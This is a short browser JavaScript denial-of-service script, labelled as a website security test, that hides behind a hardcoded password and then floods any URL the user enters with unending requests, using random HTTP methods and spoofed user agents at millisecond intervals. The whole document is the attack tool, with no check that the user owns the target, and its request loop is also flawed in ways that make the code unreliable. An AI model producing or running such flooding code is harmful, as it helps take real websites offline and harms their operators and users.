<script>
// DoS Script to Test Website Security

// Configuration
let passw = prompt('password');
if (passw !== 'testing') {
    window.location.href = "https://app.educationperfect.com/";
} else {
    console.log(passw);

    const url = prompt('Full website URL'); // Replace with your website URL
    const numRequests = Infinity;
    const interval = prompt('interval in milliseconds, 1 is good'); // Reduced interval
    const timeout = 5000; // Increased timeout to 5 seconds

    // Function to create a request
    function createRequest() {
        return new Promise((resolve, reject) => {
            const xhr = new XMLHttpRequest();
            const methods = ['GET', 'POST', 'PUT', 'DELETE'];
            const method = methods[Math.floor(Math.random() * methods.length)];
            xhr.open(method, url, true);
            xhr.timeout = timeout;
            xhr.onload = function () {
                if (xhr.status >= 200 && xhr.status < 300) {
                    resolve('Success');
                } else {
                    reject('Error');
                }
            };
            xhr.onerror = function () {
                reject('Error');
            };
            xhr.ontimeout = function () {
                reject('Timeout');
            };
            xhr.setRequestHeader('User-Agent', getRandomUserAgent());
            xhr.setRequestHeader('Custom-Header', 'Value');
            xhr.send(JSON.stringify({ key: 'value' }));
        });
    }

    // Function to get a random user agent
    function getRandomUserAgent() {
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0'
        ];
        return userAgents[Math.floor(Math.random() * userAgents.length)];
    }

    // Function to perform DoS attack
    async function performDoS() {
        const requests = [];
        for (let i = 0; i < numRequests; i++) {
            requests.push(createRequest());
        }
        try {
            await Promise.all(requests);
            alert('All requests completed successfully');
        } catch (error) {
            alert('Some requests failed:', error);
        }
    }

    // Start the DoS attack
    setInterval(performDoS, interval);
}
